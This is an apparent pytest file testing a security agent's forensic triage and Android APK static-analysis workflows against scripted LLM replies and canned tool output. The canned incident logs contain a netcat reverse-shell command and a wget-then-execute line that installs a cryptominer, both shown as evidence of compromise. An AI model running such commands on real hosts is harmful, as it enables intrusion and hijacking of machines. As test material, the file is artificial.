"""Real-world DFIR & Mobile agent scenarios (QUARR) — domain coverage tier.

The advanced/realworld suites focus on Red + Blue. This suite closes the gap on
the two domains that had no *agent-driven* scenario coverage — DFIR (digital
forensics / incident response) and Mobile (APK static analysis) — by running the
REAL agent loop over patched handlers that return realistic captured output.

  DFIR
    1. Incident-response chain: automated triage flags IOCs -> malware analysis
       of a dropped binary -> evidence collected under chain-of-custody ->
       incident timeline built. Asserts the agent records every step and the
       forensic observations land in state.
    2. Malware IOC -> threat-intel pivot: a hash pulled from malware analysis is
       enriched via the threat feed and corroborated as malicious (DFIR -> Intel).

  MOBILE
    3. APK static-analysis chain: decompile -> manifest analysis (auto-creates
       CONFIRMED findings for the debuggable + exported-component issues) ->
       secrets scan (auto-creates a HIGH hardcoded-secrets finding). Asserts the
       mobile state-update path promotes exactly the high-signal issues.
    4. Manifest triage: only CRITICAL/HIGH manifest findings become QUARR
       findings; medium/low/info stay observations (no alert fatigue).

LLM is scripted and handlers patched — no real tools, devices, or files. All
mobile/DFIR tools are requires_scope=False, so no network scope is needed;
assertions target agent STATE (findings, observations, tool history).
"""

from pathlib import Path

import pytest

import quarr.core.agent as agent_mod
from quarr.core.agent import QuarrAgent
from quarr.core.models import Engagement, FindingStatus, Severity

FIXTURES = Path(__file__).parent / "fixtures"


# --------------------------------------------------------------------------- #
# Scripted LLM + helpers
# --------------------------------------------------------------------------- #

class ScriptedLLM:
    def __init__(self, script):
        self._script = list(script)

    async def chat(self, messages, tools=None, max_tokens=1024):
        if self._script:
            return self._script.pop(0)
        return {"content": "Investigation complete.", "tool_calls": [], "raw": {}}


def _tc(name, **args):
    return {"content": "", "tool_calls": [
        {"function": {"name": name, "arguments": args}}], "raw": {}}


def _final(text):
    return {"content": text, "tool_calls": [], "raw": {}}


def _make_agent(script, monkeypatch, *, role="operator"):
    """DFIR/mobile tools don't need a network scope, but the engagement must
    exist. allowed_operations=[] means allow-all registered tools."""
    eng = Engagement(
        name="DFIR/Mobile Lab",
        allowed_targets=["10.10.10.0/24", "localhost"],
        allowed_operations=[],
    )
    monkeypatch.setattr(agent_mod, "create_llm_client", lambda **kw: ScriptedLLM(script))
    agent = QuarrAgent(engagement=eng, backend="ollama", session_role=role)
    agent.client = ScriptedLLM(script)
    return agent


# --------------------------------------------------------------------------- #
# Realistic canned forensic output
# --------------------------------------------------------------------------- #

TRIAGE_COMPROMISED = (
    "=== 1. NETWORK CONNECTIONS ===\n"
    "tcp ESTAB 0 0 10.10.10.20:44122 185.220.101.34:4444\n"
    "=== 2. SUSPICIOUS PROCESSES ===\n"
    "www 777 0.1 nc -e /bin/bash 185.220.101.34 4444\n"
    "root 666 99.0 /tmp/.x/xmrig --donate-level 1\n"
    "=== TRIAGE SUMMARY ===\n"
    "⚠️ 2 issue(s) found:\n"
    "  🚨 Suspicious connection on port :4444\n"
    "  🚨 Suspicious process: nc -e\n"
    "\nSeverity: CRITICAL"
)

MALWARE_REPORT = (
    "=== FILE TYPE ===\n"
    "/tmp/.x/xmrig: ELF 64-bit LSB executable, x86-64, statically linked, stripped\n"
    "=== HASHES ===\n"
    "MD5:    44d88612fea8a8f36de82e1278abb02f\n"
    "SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f\n"
    "Size: 2481664 bytes\n"
    "=== ENTROPY ===\n"
    "Entropy: 7.82 (HIGH - possibly packed)\n"
    "=== INTERESTING STRINGS ===\n"
    "URLs:\nhttp://pool.minexmr.com:4444\n"
    "IPs:\n185.220.101.34\n"
    "Suspicious commands:\n/bin/sh -c chmod +x /tmp/.x/xmrig\n"
)

CUSTODY_COLLECTED = (
    "=== CHAIN OF CUSTODY ===\n"
    "ID: COC-0001\n"
    "File: /tmp/.x/xmrig\n"
    "SHA256: 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f\n"
    "Collected: 2026-09-04T05:30:00\n"
    "Status: COLLECTED ✅"
)

TIMELINE_REPORT = (
    "=== INCIDENT TIMELINE (last 48h, 4 events) ===\n\n"
    "[AUTH    ] Sep 4 05:20 sshd[1234]: Accepted password for www from 185.220.101.34\n"
    "[BASH    ] [www] wget http://185.220.101.34/x.sh -O /tmp/.x/xmrig\n"
    "[BASH    ] [www] chmod +x /tmp/.x/xmrig && /tmp/.x/xmrig\n"
    "[SYSTEM  ] Sep 4 05:30 systemd: Started suspicious miner service\n"
)

MALICIOUS_HASH_VERDICT = (
    "=== THREAT INTEL: hash = 44d88612fea8a8f36de82e1278abb02f ===\n\n"
    "=== VIRUSTOTAL: hash = 44d88612fea8a8f36de82e1278abb02f ===\n"
    "Detections: 61/72\n"
    "Type: ELF\n"
    "Name: xmrig-miner\n"
    "Tags: miner, trojan, coinminer\n"
    "\n🚨 MALICIOUS — 61 engines detected this file\n"
    "--- Checked 1 source(s) ---"
)

APK_DECOMPILE_OK = (
    "[apktool] Decoded to /tmp/quarr_apk/bankapp (1423 files)\n"
    "[jadx] Decompiled to /tmp/quarr_apk/bankapp-src (2890 files)\n"
)


# =========================================================================== #
# 1. DFIR incident-response chain
# =========================================================================== #

@pytest.mark.integration
async def test_dfir_incident_response_chain(monkeypatch):
    script = [
        _tc("incident_triage"),
        _tc("malware_analyze", filepath="/tmp/.x/xmrig"),
        _tc("chain_of_custody", filepath="/tmp/.x/xmrig", action="collect",
            notes="cryptominer dropped via www user"),
        _tc("build_incident_timeline", hours=48),
        _final(
            "Incident confirmed: reverse shell + xmrig miner from 185.220.101.34. "
            "Malware hashed, evidence collected, timeline reconstructed."
        ),
    ]
    agent = _make_agent(script, monkeypatch)

    reg = agent_mod.TOOL_REGISTRY
    monkeypatch.setattr(reg["incident_triage"], "handler", lambda **kw: TRIAGE_COMPROMISED)
    monkeypatch.setattr(reg["malware_analyze"], "handler", lambda **kw: MALWARE_REPORT)
    monkeypatch.setattr(reg["chain_of_custody"], "handler", lambda **kw: CUSTODY_COLLECTED)
    monkeypatch.setattr(reg["build_incident_timeline"], "handler", lambda **kw: TIMELINE_REPORT)

    result = await agent.run("Investigate the compromised host and preserve evidence")

    ran = [t.tool_name for t in agent.state.tool_history]
    assert ran == [
        "incident_triage", "malware_analyze",
        "chain_of_custody", "build_incident_timeline",
    ]
    # Every forensic step succeeded (no crash, no error markers).
    assert all(t.success for t in agent.state.tool_history)
    # Each DFIR tool recorded an observation in the world model.
    obs_tools = {o.source_tool for o in agent.state.observations}
    assert {"incident_triage", "malware_analyze",
            "chain_of_custody", "build_incident_timeline"} <= obs_tools
    assert "185.220.101.34" in result


# =========================================================================== #
# 2. DFIR -> Intel pivot: malware hash enriched and confirmed malicious
# =========================================================================== #

@pytest.mark.integration
async def test_dfir_malware_hash_threat_intel_pivot(monkeypatch):
    script = [
        _tc("malware_analyze", filepath="/tmp/.x/xmrig"),
        _tc("threat_feed_check", ioc_type="hash",
            value="44d88612fea8a8f36de82e1278abb02f"),
        _final(
            "Dropped binary confirmed malicious: VirusTotal 61/72 (xmrig coinminer)."
        ),
    ]
    agent = _make_agent(script, monkeypatch)

    reg = agent_mod.TOOL_REGISTRY
    monkeypatch.setattr(reg["malware_analyze"], "handler", lambda **kw: MALWARE_REPORT)
    monkeypatch.setattr(reg["threat_feed_check"], "handler", lambda **kw: MALICIOUS_HASH_VERDICT)

    result = await agent.run("Analyze the dropped file and check its hash reputation")

    ran = [t.tool_name for t in agent.state.tool_history]
    assert ran == ["malware_analyze", "threat_feed_check"]
    assert all(t.success for t in agent.state.tool_history)
    # The intel verdict was recorded and the conclusion cites the detection.
    assert any(o.source_tool == "threat_feed_check" for o in agent.state.observations)
    assert "61/72" in result or "malicious" in result.lower()


# =========================================================================== #
# 3. Mobile APK static-analysis chain: manifest + secrets -> findings
# =========================================================================== #

@pytest.mark.integration
async def test_mobile_apk_static_analysis_chain(monkeypatch):
    manifest = (FIXTURES / "apk_manifest.txt").read_text()
    secrets = (FIXTURES / "apk_secrets.txt").read_text()

    script = [
        _tc("apk_decompile", apk_path="/samples/bankapp.apk"),
        _tc("apk_manifest_analysis", apk_decoded_dir="/tmp/quarr_apk/bankapp"),
        _tc("apk_secrets_scan", directory="/tmp/quarr_apk/bankapp-src"),
        _final(
            "APK assessment: debuggable production build, exported TransferActivity, "
            "and 3 hardcoded secrets (Google/AWS keys) found."
        ),
    ]
    agent = _make_agent(script, monkeypatch)

    reg = agent_mod.TOOL_REGISTRY
    monkeypatch.setattr(reg["apk_decompile"], "handler", lambda **kw: APK_DECOMPILE_OK)
    monkeypatch.setattr(reg["apk_manifest_analysis"], "handler", lambda **kw: manifest)
    monkeypatch.setattr(reg["apk_secrets_scan"], "handler", lambda **kw: secrets)

    result = await agent.run("Do a static assessment of bankapp.apk")

    ran = [t.tool_name for t in agent.state.tool_history]
    assert ran == ["apk_decompile", "apk_manifest_analysis", "apk_secrets_scan"]

    # Manifest analysis auto-promoted the 1 CRITICAL + 2 HIGH issues to CONFIRMED
    # findings; the secrets scan added 1 HIGH hardcoded-secrets finding.
    manifest_findings = [f for f in agent.state.findings
                         if f.title.startswith("Android Manifest")]
    assert len(manifest_findings) == 3
    assert all(f.status == FindingStatus.CONFIRMED for f in manifest_findings)

    secret_findings = [f for f in agent.state.findings
                       if "hardcoded secret" in f.title.lower()]
    assert len(secret_findings) == 1
    assert secret_findings[0].severity == Severity.HIGH
    # The secret evidence was captured (truncated content of each hit).
    assert secret_findings[0].evidence

    assert "secret" in result.lower()


# =========================================================================== #
# 4. Mobile manifest triage: only CRITICAL/HIGH promote to findings
# =========================================================================== #

@pytest.mark.integration
async def test_mobile_manifest_triage_promotes_only_high_signal(monkeypatch):
    manifest = (FIXTURES / "apk_manifest.txt").read_text()

    script = [
        _tc("apk_manifest_analysis", apk_decoded_dir="/tmp/quarr_apk/bankapp"),
        _final("Manifest triaged."),
    ]
    agent = _make_agent(script, monkeypatch)

    reg = agent_mod.TOOL_REGISTRY
    monkeypatch.setattr(reg["apk_manifest_analysis"], "handler", lambda **kw: manifest)

    await agent.run("Analyze the AndroidManifest")

    # Fixture has 1 critical, 2 high, 1 medium, 1 low, 1 info.
    # Only critical + high are promoted (3 findings); the rest stay observations.
    findings = agent.state.findings
    assert len(findings) == 3
    sevs = [f.severity for f in findings]
    assert sevs.count(Severity.CRITICAL) == 1
    assert sevs.count(Severity.HIGH) == 2
    assert Severity.MEDIUM not in sevs
    assert Severity.LOW not in sevs
    assert Severity.INFO not in sevs
    # An observation summarizing the full manifest analysis is still recorded.
    assert any(o.source_tool == "apk_manifest_analysis" for o in agent.state.observations)
